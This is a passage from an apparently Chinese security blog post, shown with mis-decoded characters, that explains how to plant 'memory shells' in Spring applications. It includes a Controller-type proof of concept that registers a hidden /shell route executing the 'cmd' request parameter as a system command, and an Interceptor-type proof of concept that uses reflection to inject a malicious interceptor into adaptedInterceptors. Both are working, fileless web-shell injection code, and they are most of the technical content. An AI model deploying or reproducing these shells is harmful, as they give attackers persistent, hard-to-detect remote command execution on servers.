<p>å…ˆè·å–å½“å‰çš„ä¸Šä¸‹æ–‡ï¼Œç„¶åè·å–RequestMappingHandlerMapping çš„å®ä¾‹ï¼Œç„¶ååœ¨åå°„è·å–æˆ‘ä»¬å†™å¥½çš„æ¶æ„ç±»çš„æ¶æ„æ–¹æ³•ï¼Œç„¶åè·å–å¹¶ä¸”è®¾ç½®æˆ‘ä»¬æƒ³è¦æŠŠæ¶æ„ç±»æ˜ å°„åˆ°çš„è·¯å¾„ï¼Œå’Œè¯·æ±‚æ–¹æ³•ï¼Œè®¾ç½®åˆ°RequestMappingInfoç±»ä¸­ï¼Œç„¶ååœ¨è°ƒç”¨RequestMappingHandlerMappingä¸­çš„registerMappingæ–¹æ³•ï¼Œå®ŒæˆåŠ¨æ€æ³¨å…¥</p>
<pre><code class="language-java">package org.example.spring.Controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Method;

@RestController
public class shell_controller {

    @RequestMapping(&quot;/exec&quot;)
    public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException {

        //è·å–å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒ
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);

        //æ‰‹åŠ¨æ³¨å†ŒController
        // 1. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹ bean
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        // 2. é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰ controller ä¸­å”¯ä¸€çš„ Method å¯¹è±¡
        Method method = Shell.class.getDeclaredMethod(&quot;shell&quot;);
        // 3. å®šä¹‰è®¿é—® controller çš„ URL åœ°å€
        PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shell&quot;);
        // 4. å®šä¹‰å…è®¸è®¿é—® controller çš„ HTTP æ–¹æ³•ï¼ˆGET/POSTï¼‰
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†Œ controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        r.registerMapping(info, new Shell(), method);

    }

    @ResponseBody
    public class Shell{

        public Shell(){}

        public void shell() throws IOException {
            //è·å–request
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
        }
    }

}
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://bloyet.github.io/post-images/1752214131517.png" alt="" loading="lazy"></figure>
<p>è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œåœ¨springbootç‰ˆæœ¬å¤§äº2.6.0çš„æ—¶å€™ä¼šå‡ºç°ä¸€ä¸ªæŠ¥é”™å¯¼è‡´å‘½ä»¤æ‰§è¡Œå¤±è´¥</p>
<p>è§£å†³åŠæ³•å‚è€ƒï¼š<a href="https://yyjccc.github.io/2024/03/12/Spring%E5%86%85%E5%AD%98%E9%A9%AC/">Springå†…å­˜é©¬</a></p>
<h1 id="interceptorå‹å†…å­˜é©¬">Interceptorå‹å†…å­˜é©¬</h1>
<h2 id="ä»€ä¹ˆæ˜¯interceptor">ä»€ä¹ˆæ˜¯Interceptor</h2>
<p>Spring MVC çš„æ‹¦æˆªå™¨ï¼ˆInterceptorï¼‰ä¸ Java Servlet çš„è¿‡æ»¤å™¨ï¼ˆFilterï¼‰ç±»ä¼¼ï¼Œå®ƒä¸»è¦ç”¨äºæ‹¦æˆªç”¨æˆ·çš„è¯·æ±‚å¹¶åšç›¸åº”çš„å¤„ç†ï¼Œé€šå¸¸åº”ç”¨åœ¨æƒé™éªŒè¯ã€è®°å½•è¯·æ±‚ä¿¡æ¯çš„æ—¥å¿—ã€åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ç™»å½•ç­‰åŠŸèƒ½ä¸Šã€‚åœ¨ Spring MVC æ¡†æ¶ä¸­å®šä¹‰ä¸€ä¸ªæ‹¦æˆªå™¨éœ€è¦å¯¹æ‹¦æˆªå™¨è¿›è¡Œå®šä¹‰å’Œé…ç½®ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ 2 ç§æ–¹å¼ã€‚</p>
<p>é€šè¿‡å®ç° HandlerInterceptor æ¥å£æˆ–ç»§æ‰¿ HandlerInterceptor æ¥å£çš„å®ç°ç±»ï¼ˆä¾‹å¦‚ HandlerInterceptorAdapterï¼‰æ¥å®šä¹‰</p>
<p>é€šè¿‡å®ç° WebRequestInterceptor æ¥å£æˆ–ç»§æ‰¿ WebRequestInterceptor æ¥å£çš„å®ç°ç±»æ¥å®šä¹‰</p>
<h2 id="interceptorç¤ºä¾‹">Interceptorç¤ºä¾‹</h2>
<p>åœ¨springbootä¸‹å†™äº†ï¼š</p>
<p>WebConfig</p>
<pre><code class="language-java">package org.example.spring.Config;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.*;

@Configuration
public class WebConfig implements WebMvcConfigurer {

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(new org.example.spring.Interceptor.MyInterceptor())
                .addPathPatterns(&quot;/**&quot;)       // æ‹¦æˆªæ‰€æœ‰è·¯å¾„
                .excludePathPatterns(&quot;/login&quot;); // æ’é™¤ç™»å½•è·¯å¾„
    }
}
</code></pre>
<p>TestController</p>
<pre><code class="language-java">package org.example.spring.Controller;

import org.springframework.web.bind.annotation.*;

@RestController
public class TestController {

    @GetMapping(&quot;/hello&quot;)
    public String hello() {
        return &quot;Hello, world!&quot;;
    }

    @GetMapping(&quot;/login&quot;)
    public String login() {
        return &quot;Login page (not intercepted)&quot;;
    }
}
</code></pre>
<p>MyInterceptor</p>
<pre><code class="language-java">package org.example.spring.Interceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.web.servlet.HandlerInterceptor;

public class MyInterceptor implements HandlerInterceptor {

    @Override
    public boolean preHandle(HttpServletRequest request,
                             HttpServletResponse response,
                             Object handler) throws Exception {
        System.out.println(&quot;è¿›å…¥æ‹¦æˆªå™¨ï¼šMyInterceptor -&gt; preHandle&quot;);
        // è¿”å› true ç»§ç»­æ‰§è¡Œï¼Œfalse åˆ™ç»ˆæ­¢è¯·æ±‚é“¾
        return false;
    }
}
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://bloyet.github.io/post-images/1752214131533.png" alt="" loading="lazy"></figure>
<p>æ•ˆæœå°±è·ŸFilterå·®ä¸å¤šï¼Œå½“è®¿é—®çš„è·¯ç”±ä¸æ˜¯loginï¼Œå°±ä¼šè¿›å…¥æ‹¦æˆªå™¨ å¦‚æœè¿”å›trueå°±ç»§ç»­æ‰§è¡Œï¼Œå¦‚æœè¿”å›ä¸ºfalseå°±ä¸­æ–­è¿™æ¬¡åŸæ¥å¯¹åº”çš„å¤„ç†æ–¹æ³•</p>
<p>æ–­ç‚¹ä¸‹åœ¨ApplicationFilterChain#internalDoFilterï¼Œå¯ä»¥çœ‹åˆ°å’Œæˆ‘ä»¬ä¹‹å‰å­¦çš„Tomcatå¾ˆåƒï¼Œä½†ä¸Tomcatä¸åŒçš„æ˜¯ï¼Œå½“è°ƒç”¨åˆ°HttpServlet#serviceæ—¶ï¼Œæœ€ç»ˆä¼šè°ƒç”¨DispatcherServlet#doDispatchè¿›è¡Œé€»è¾‘å¤„ç†ï¼Œè¿™æ­£æ˜¯Springçš„é€»è¾‘å¤„ç†æ ¸å¿ƒç±»ã€‚</p>
<figure data-type="image" tabindex="6"><img src="https://bloyet.github.io/post-images/1752214131549.png" alt="" loading="lazy"></figure>
<p>æˆ‘ä»¬å°±ç›´æ¥æ¥çœ‹æ ¸å¿ƒç±»</p>
<figure data-type="image" tabindex="7"><img src="https://bloyet.github.io/post-images/1752214131564.png" alt="" loading="lazy"></figure>
<p>è·Ÿè¿›getHandleræ–¹æ³•ï¼š</p>
<p>ä½¿ç”¨å¢å¼ºforè¯­å¥ éå†handlerMappingsæ¥è·å–HandlerMappingç±»å‹çš„å¯¹è±¡</p>
<pre><code class="language-java">protected HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {
    if (this.handlerMappings != null) {
        for(HandlerMapping mapping : this.handlerMappings) {
            HandlerExecutionChain handler = mapping.getHandler(request);
            if (handler != null) {
                return handler;
            }
        }
    }

    return null;
}
</code></pre>
<p>å®é™…ä¸Šè¿˜ä¼šè°ƒç”¨org.springframework.web.servlet.handler.AbstractHandlerMapping ç±»çš„ getHandler æ–¹æ³•</p>
<pre><code class="language-java">public final HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {
    Object handler = this.getHandlerInternal(request);
    if (handler == null) {
        handler = this.getDefaultHandler();
    }

    if (handler == null) {
        return null;
    } else {
        if (handler instanceof String) {
            String handlerName = (String)handler;
            handler = this.obtainApplicationContext().getBean(handlerName);
        }

        if (!ServletRequestPathUtils.hasCachedPath(request)) {
            this.initLookupPath(request);
        }

        HandlerExecutionChain executionChain = this.getHandlerExecutionChain(handler, request);
        if (this.logger.isTraceEnabled()) {
            this.logger.trace(&quot;Mapped to &quot; + handler);
        } else if (this.logger.isDebugEnabled() &amp;&amp; !DispatcherType.ASYNC.equals(request.getDispatcherType())) {
            this.logger.debug(&quot;Mapped to &quot; + executionChain.getHandler());
        }

        if (this.hasCorsConfigurationSource(handler) || CorsUtils.isPreFlightRequest(request)) {
            CorsConfiguration config = this.getCorsConfiguration(handler, request);
            if (this.getCorsConfigurationSource() != null) {
                CorsConfiguration globalConfig = this.getCorsConfigurationSource().getCorsConfiguration(request);
                config = globalConfig != null ? globalConfig.combine(config) : config;
            }

            if (config != null) {
                config.validateAllowCredentials();
            }

            executionChain = this.getCorsHandlerExecutionChain(request, executionChain, config);
        }

        return executionChain;
    }
}
</code></pre>
<p>è·Ÿè¿›getHandlerExecutionChainæ–¹æ³•ï¼š</p>
<p>é€šè¿‡éå†adaptedInterceptors è·å–åˆ°æ‰€æœ‰çš„HandlerInterceptor</p>
<pre><code class="language-java">protected HandlerExecutionChain getHandlerExecutionChain(Object handler, HttpServletRequest request) {
    HandlerExecutionChain chain = handler instanceof HandlerExecutionChain ? (HandlerExecutionChain)handler : new HandlerExecutionChain(handler);

    for(HandlerInterceptor interceptor : this.adaptedInterceptors) {
        if (interceptor instanceof MappedInterceptor) {
            MappedInterceptor mappedInterceptor = (MappedInterceptor)interceptor;
            if (mappedInterceptor.matches(request)) {
                chain.addInterceptor(mappedInterceptor.getInterceptor());
            }
        } else {
            chain.addInterceptor(interceptor);
        }
    }

    return chain;
}
</code></pre>
<p>æ‰¾åˆ°äº†æˆ‘ä»¬è‡ªå®šä¹‰çš„interceptor</p>
<figure data-type="image" tabindex="8"><img src="https://bloyet.github.io/post-images/1752214131579.png" alt="" loading="lazy"></figure>
<p>ç„¶ååœ¨é€šè¿‡chain.addInterceptor æŠŠæ‰€æœ‰çš„interceptoræ·»åŠ åˆ°HandlerExecutionChainä¸­ï¼Œç„¶åå°±ç»“æŸäº†ï¼Œå›åˆ°</p>
<p>ä¸€å¼€å§‹çš„DispatcherServlet#doDispatch()ä¸­ï¼Œè°ƒç”¨mappedHandler.applyPreHandleæ–¹æ³•</p>
<figure data-type="image" tabindex="9"><img src="https://bloyet.github.io/post-images/1752214131595.png" alt="" loading="lazy"></figure>
<p>ç„¶åéå†è°ƒç”¨Interceptorä¸­çš„preHandle()æ‹¦æˆªæ–¹æ³•</p>
<h2 id="å®ç°æ€è·¯">å®ç°æ€è·¯</h2>
<p>è·å–ä¸Šä¸‹æ–‡</p>
<p>å®ç°ä¸€ä¸ªæ¶æ„Interceptorç±»</p>
<p>åŠ¨æ€æ³¨å†Œè¿›å†…å­˜</p>
<h3 id="è·å–ä¸Šä¸‹æ–‡-2">è·å–ä¸Šä¸‹æ–‡</h3>
<p>è·å–ä¸Šä¸‹æ–‡å’ŒControlleræ€è·¯æ˜¯ä¸€æ ·çš„</p>
<p>åŒæ—¶ï¼Œæˆ‘ä»¬é€šè¿‡åˆšåˆšçš„è°ƒè¯•å¯ä»¥çŸ¥é“ï¼ŒInterceptorç±»çš„ä¿¡æ¯æ˜¯å­˜å‚¨åœ¨adaptedInterceptorsä¸­çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åå°„è·å–åˆ°è¿™ä¸ªå±æ€§å¹¶ä¸”æŠŠæ¶æ„ç±»æ·»åŠ è¿›å»</p>
<figure data-type="image" tabindex="10"><img src="https://bloyet.github.io/post-images/1752214131612.png" alt="" loading="lazy"></figure>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è·å–ä¸Šä¸‹æ–‡æ¥ è·å–åˆ°è¿™ä¸ªå¯¹è±¡ï¼ˆBeanï¼‰çš„adaptedInterceptorså±æ€§</p>
<h3 id="å®ç°æ¶æ„interceptorç±»">å®ç°æ¶æ„Interceptorç±»</h3>
<p>æˆ‘ä»¬éœ€è¦å®ç°HandlerInterceptorç±»ï¼Œé‡å†™preHandleæ–¹æ³•</p>
<pre><code class="language-java">public class MyInterceptor implements HandlerInterceptor {

    @Override
    public boolean preHandle(HttpServletRequest request,
                             HttpServletResponse response,
                             Object handler) throws Exception {
        Runtime.getRuntime().exec(&quot;calc&quot;);
        // è¿”å› true ç»§ç»­æ‰§è¡Œï¼Œfalse åˆ™ç»ˆæ­¢è¯·æ±‚é“¾
        return false;

    }
}
</code></pre>
<h3 id="åŠ¨æ€æ³¨å…¥">åŠ¨æ€æ³¨å…¥</h3>
<p>adaptedInterceptorså…¶å®æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨addæ–¹æ³•æ·»åŠ æˆ‘ä»¬çš„æ¶æ„ç±»å°±è¡Œï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬</p>
<pre><code class="language-java">å®é™…ä¸Šè·å–åˆ°çš„æ˜¯å®ƒçš„å®ç°ç±»org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping
æ‰€ä»¥æ˜¯ä¸èƒ½ç›´æ¥é€šè¿‡ä»–æ¥åå°„è·å–å­—æ®µ
AbstractHandlerMapping handlerMapping = (AbstractHandlerMapping) context.getBean(AbstractHandlerMapping.class);
</code></pre>
<h3 id="poc-2">POC</h3>
<pre><code class="language-java">package org.example.spring.Controller;


import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.util.ArrayList;

@Controller
public class shellInterceptor {
    @RequestMapping(&quot;/shell&quot;)
    public void shell() throws Exception {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
        AbstractHandlerMapping handlerMapping = (AbstractHandlerMapping) context.getBean(AbstractHandlerMapping.class);
        System.out.println(handlerMapping.getClass().getName());
        Field field = AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);
        field.setAccessible(true);
        ArrayList list = (ArrayList) field.get(handlerMapping);
        list.add(new shell_Interceptor());

    }

    public class shell_Interceptor implements HandlerInterceptor {

        @Override
        public boolean preHandle(HttpServletRequest request,
                                 HttpServletResponse response,
                                 Object handler) throws Exception {
            Runtime.getRuntime().exec(&quot;calc&quot;);
            // è¿”å› true ç»§ç»­æ‰§è¡Œï¼Œfalse åˆ™ç»ˆæ­¢è¯·æ±‚é“¾
            return false;


        }
    }
}
</code></pre>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#spring%E4%BB%8B%E7%BB%8D">Springä»‹ç»</a>
<ul>
<li><a href="#ioc">IOC</a></li>
<li><a href="#aop">AOP</a></li>
<li><a href="#springmvc">SpringMVC</a></li>
<li><a href="#applicationcontext">ApplicationContext</a></li>
</ul>
</li>
<li><a href="#controller%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Controllerå‹å†…å­˜é©¬</a>
<ul>
<li><a href="#%E6%80%9D%E8%B7%AF">æ€è·¯ï¼š</a></li>
<li><a href="#%E8%8E%B7%E5%8F%96%E4%B8%8A%E4%B8%8B%E6%96%87">è·å–ä¸Šä¸‹æ–‡</a>
<ul>
<li><a href="#getcurrentwebapplicationcontext">getCurrentWebApplicationContext</a></li>
<li><a href="#webapplicationcontextutils">WebApplicationContextUtils</a></li>
<li><a href="#requestcontextutils">RequestContextUtils</a></li>
<li><a href="#getattribute"><strong>getAttribute</strong></a></li>
</ul>
</li>
<li><a href="#%E6%B3%A8%E5%86%8C%E6%81%B6%E6%84%8Fcontroller">æ³¨å†Œæ¶æ„Controller</a>
<ul>
<li><a href="#registermapping">registerMapping</a></li>
<li><a href="#registerhandler">registerHandler</a></li>
<li><a href="#detecthandlermethods">detectHandlerMethods</a></li>
</ul>
</li>
<li><a href="#poc">POC</a></li>
</ul>
</li>
<li><a href="#interceptor%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Interceptorå‹å†…å­˜é©¬</a>
<ul>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFinterceptor">ä»€ä¹ˆæ˜¯Interceptor</a></li>
<li><a href="#interceptor%E7%A4%BA%E4%BE%8B">Interceptorç¤ºä¾‹</a></li>
<li><a href="#%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF">å®ç°æ€è·¯</a>
<ul>
<li><a href="#%E8%8E%B7%E5%8F%96%E4%B8%8A%E4%B8%8B%E6%96%87-2">è·å–ä¸Šä¸‹æ–‡</a></li>
<li><a href="#%E5%AE%9E%E7%8E%B0%E6%81%B6%E6%84%8Finterceptor%E7%B1%BB">å®ç°æ¶æ„Interceptorç±»</a></li>
<li><a href="#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%85%A5">åŠ¨æ€æ³¨å…¥</a></li>
<li><a href="#poc-2">POC</a></li>
</ul>
</li>
</ul>
</li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">ä¸‹ä¸€ç¯‡</div>
            <a href="https://bloyet.github.io/post/tomcat-xing-nei-cun/">
              <h3 class="post-title">
                Tomcatå‹å†…å­˜ğŸ
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://bloyet.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
